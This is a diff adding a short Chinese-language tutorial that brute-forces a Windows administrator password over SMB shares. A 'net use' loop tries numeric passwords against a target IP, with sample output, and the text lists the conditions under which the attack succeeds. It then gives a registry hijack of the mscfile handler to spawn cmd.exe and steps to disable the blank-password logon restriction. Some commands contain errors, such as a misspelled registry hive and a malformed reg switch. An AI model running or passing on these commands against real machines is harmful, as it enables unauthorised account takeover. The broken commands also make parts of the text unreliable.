@@ -1,0 +1,34 @@
+C:\Users\Administrator>for /L %i in (1,1,1000) do net use \\xxx.xxx.xxx.xxx %i /user:administrator
+C:\Users\Administrator>net use \\xxx.xxx.xxx.xxx 1 /user:administrator
+发生系统错误1326.
+用户名或密码不正确.
+这段语句将执行一个步长为1,从1到1000的循环.do后面的语句net use尝试建立一个连接,%i则是需填写的密码,默认为锁屏密码,如果该ip同时具有下列几个条件
+已知用户名为Administrator
+没有打开防火墙 具体操作就是win+r打开运行,输入firewall.cpl,点击启用或关闭防火墙勾选关闭并点确定即可.
+密码是纯数字的且在8位以下
+具有默认共享,比如ipc$,ADMIN$.
+攻击机和它在同一网段下(通俗说就是ip的前三位一样子网掩码都为255.255.255.0,或者说连上了同一wifi)
+那么只需要适当调整括号里最后一个数字即可建立连接.
+C:\Users\Administrator>net use \\192.168.125.121 123 /user:administrator
+命令成功完成.
+C:\Users\Administrator>net use \\192.168.125.121 124 /user:administrator
+发生系统错误 1219.
+不允许一个用户使用一个以上用户名与服务器或共享资源的多重连接.中断与此服务器或共享资源的所有连接,然后再试一次.
+1.win+r
+2.secpol.msc（如果在命令提示符中键入了如下命令
+reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /ve /f /REG_SZ /d cmd.exe
+1,2两步将会打开一个命令提示符.
+此时只需执行reg delete HKCU\SOFTWARE\Classes\mscfile\shell\open\command
+回车并输入yes ）
+3.安全设置
+4.本地策略
+5.安全选项
+6.右键 账户:使用空密码的本地账户只允许进行控制台登录
+7.已禁用
+1.win+r
+2.regedit
+3.HEKY_LOACL_MACHINE\SYSTEM\ControlSet001\Control\Lsa
+4.右键LimitBlankPasswordUse
+5.修改
+6.0
+这六步和上面的七步起到的效果是一样的.
